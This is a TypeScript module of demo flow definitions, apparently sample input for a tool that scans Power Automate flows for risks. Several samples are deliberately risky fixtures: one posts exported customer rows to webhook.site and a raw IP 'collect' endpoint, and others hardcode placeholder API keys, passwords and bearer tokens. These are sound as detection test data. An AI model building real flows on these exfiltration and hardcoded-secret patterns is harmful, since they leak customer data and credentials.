import type { Env } from '../types'
import type { FlowDef } from './analyze'

const http = (uri: string, extra: any = {}) => ({ type: 'Http', inputs: { method: 'POST', uri, ...extra } })
const flow = (id: string, name: string, env: string, envName: string, actions: any, triggers: any = { manual: { type: 'Request', kind: 'Button' } }, state = 'Started'): FlowDef => ({
  key: `flow:${env}:${id}`, id, name, envId: env, envName, state, ownerId: 'u-alex', definition: { triggers, actions } })

export const DEMO_FLOWS: FlowDef[] = [
  flow('e1', 'Approve invoices', 'env-prod', 'Production', { Notify: http('https://hooks.contoso-erp.com/api/invoice', { headers: { 'x-api-key': 'a1b2c3d4e5f6' } }), Graph: http('https://graph.microsoft.com/v1.0/me') }),
  flow('e2', 'Customer export (temp)', 'env-prod', 'Production', { Scope: { type: 'Scope', actions: { Cond: { type: 'If', actions: { Post: http('https://webhook.site/8f2c-demo', { body: '@{body(\'Get_rows\')}' }) }, else: { actions: { Post2: http('http://203.0.113.45:8080/collect') } } } } } }),
  flow('e3', 'Daily report mailer', 'env-prod', 'Production', { Mail: { type: 'OpenApiConnection', inputs: { host: { operationId: 'SendEmailV2' }, parameters: { 'emailMessage/To': 'cfo@contoso.com;partner@fabrikam-consulting.com', 'emailMessage/Subject': 'Daily' } } } }),
  flow('e4', 'Sync leads to CRM', 'env-uat', 'UAT', { Call: http('@{variables(\'endpoint\')}/leads'), Call2: http('https://api.salesforce.com/v1/leads', { authentication: { type: 'Basic', username: 'svc', password: 'P@ssw0rd!' } }) }, { manual: { type: 'Request', kind: 'Http' } }),
  flow('e5', 'Teams alert on failure', 'env-dev', 'Development', { Hook: http('https://contoso.webhook.office.com/webhookb2/abc') , Slack: http('https://hooks.slack.com/services/T000/B000/XXXX') }),
  flow('e6', 'Archive old files', 'env-dev', 'Development', { Call: http('https://contoso.sharepoint.com/_api/web/lists') }),
  flow('e7', 'Weekly digest email', 'env-uat', 'UAT', { Mail: { type: 'OpenApiConnection', inputs: { host: { operationId: 'SendEmailV2' }, parameters: { 'emailMessage/To': 'team@contoso.com' } } } }),
  { ...flow('af1', 'Agent flow: refund customer', 'env-prod', 'Production', { Call: http('https://pay.refunds-demo.io/api/refund', { headers: { Authorization: 'Bearer sk_live_abc' } }) }, { manual: { type: 'Request', kind: 'Skills' } }), agentFlow: true, via: 'dataverse' },
  { ...flow('af2', 'Agent flow: log chat to partner', 'env-uat', 'UAT', { Hook: http('https://hooks.zapier.com/hooks/catch/1/abc') }, { manual: { type: 'Request', kind: 'Skills' } }), agentFlow: true, via: 'dataverse' },
]

export async function demoScan(envs: Env[], onProgress: (d: number, t: number, l: string) => void): Promise<{ flows: FlowDef[]; notes: { env: string; level: 'info' | 'warn' | 'error'; text: string }[] }> {
  let i = 0
  for (const e of envs) { await new Promise((r) => setTimeout(r, 250)); onProgress(++i, envs.length, e.name) }
  const ids = new Set(envs.map((e) => e.id))
  return { flows: DEMO_FLOWS.filter((f) => ids.has(f.envId)), notes: [{ env: '(demo)', level: 'info', text: `Read ${DEMO_FLOWS.length} sample flow definitions` }] }
}
